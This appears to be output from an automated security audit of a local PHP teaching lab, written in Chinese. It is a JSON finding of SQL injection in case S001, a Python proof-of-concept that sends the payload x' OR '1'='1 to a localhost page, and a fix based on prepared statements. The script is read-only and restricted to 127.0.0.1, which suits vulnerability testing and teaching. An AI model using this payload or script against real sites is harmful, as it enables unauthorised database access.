@@ -1,0 +1,94 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入，未见过滤、类型限制或白名单。",
+    "flow": "F01:0010 将 $name 直接拼接到 WHERE name = '...' 的 SQL 字符串中；F01:0011 将该拼接 SQL 交给 $db->query($sql) 执行。",
+    "guard": "无效：F01:0010 使用字符串拼接，未见预处理绑定、mysqli_real_escape_string、强制类型转换或列名/表达式白名单；F01:0022-0023 的 htmlspecialchars 仅用于输出转义，不防护 SQL 注入。",
+    "sink": "F01:0011 mysqli::query 执行拼接后的 SQL，结果经 F01:0012 读取并在 F01:0021-0023 输出。"
+  },
+  "prerequisites": [
+    "PHP + MariaDB 本地教学环境运行，入口 http://127.0.0.1:4280/lab_cases/S001/index.php 可达",
+    "公共连接文件已成功提供 mysqli 变量 $db",
+    "lab_people 表存在并预置 (1,Alice)、(2,Bob)、(3,Carol)",
+    "无需登录，查询结果在 HTML 正文展示"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体连接与异常配置未在输入包中展开；本判断依据 runtime_context 假定 $db 已连接。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行：python3 poc_s001.py。脚本固定目标为 http://127.0.0.1:4280/lab_cases/S001/index.php，拒绝重定向，不修改数据。普通对照 name=Alice 预期解析到仅 (1,Alice)；测试 name=x' OR '1'='1 预期解析到 (1,Alice)、(2,Bob)、(3,Carol) 三行，数据库记录不应改变。成功条件比较解析后的实际业务记录集合，不以 HTTP 200 或字符串出现为成功。观察者浏览器应看到普通请求一条、测试请求三条；数据库仍为原三条记录。失败需检查入口可达、$db 连接、lab_people 初始化及页面是否输出查询失败。当前仅为模型分析发现；脚本可执行；漏洞未实际触发。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+# S001 SQL 注入本地验证脚本：仅允许固定目标 127.0.0.1:4280，不修改数据。
+import html
+import re
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280"
+PATH = "/lab_cases/S001/index.php"
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        raise RuntimeError(f"拒绝重定向: HTTP {code} -> {newurl}")
+
+def fetch_records(name):
+    url = BASE + PATH + "?" + urllib.parse.urlencode({"name": name})
+    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
+    opener = urllib.request.build_opener(NoRedirect())
+    try:
+        with opener.open(req, timeout=5) as resp:
+            if resp.geturl() != url:
+                raise RuntimeError(f"最终 URL 不是固定目标: {resp.geturl()}")
+            body = resp.read().decode("utf-8", "replace")
+    except Exception as exc:
+        raise RuntimeError(f"请求失败: {url}; {exc}") from exc
+
+    pattern = re.compile(r"<p>ID\s*(\d+)：([^<]*)</p>")
+    records = []
+    for match in pattern.finditer(body):
+        records.append((match.group(1), html.unescape(match.group(2)).strip()))
+    return records
+
+def main():
+    normal_name = "Alice"
+    test_name = "x' OR '1'='1"
+
+    normal_records = fetch_records(normal_name)
+    test_records = fetch_records(test_name)
+
+    expected_normal = [("1", "Alice")]
+    expected_test = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}
+
+    print("普通对照记录:", normal_records)
+    print("测试输入记录:", test_records)
+
+    if normal_records != expected_normal:
+        print("普通对照失败：预期仅 (1,Alice)。请检查入口、$db 连接、lab_people 初始化和查询错误页。")
+        return 1
+
+    if len(test_records) != 3 or set(test_records) != expected_test:
+        print("测试未达到预期：预期测试输入返回全部三条预置记录，普通输入仅返回 Alice。")
+        print("失败需检查数据库初始化、连接状态、页面路径及是否出现查询失败。")
+        return 1
+
+    print("POC成功：普通输入仅返回 Alice；测试输入使查询返回 Alice、Bob、Carol 三条记录。")
+    print("注意：该脚本只读验证，不修改数据库记录。")
+    return 0
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+防护建议：对 `name` 使用 mysqli 预处理与 `bind_param` 作为绑定值，不将外部输入拼入 SQL 结构；输出转义不能替代 SQL 参数化。以上修复建议不是已验证事实。
+
+```json
+{
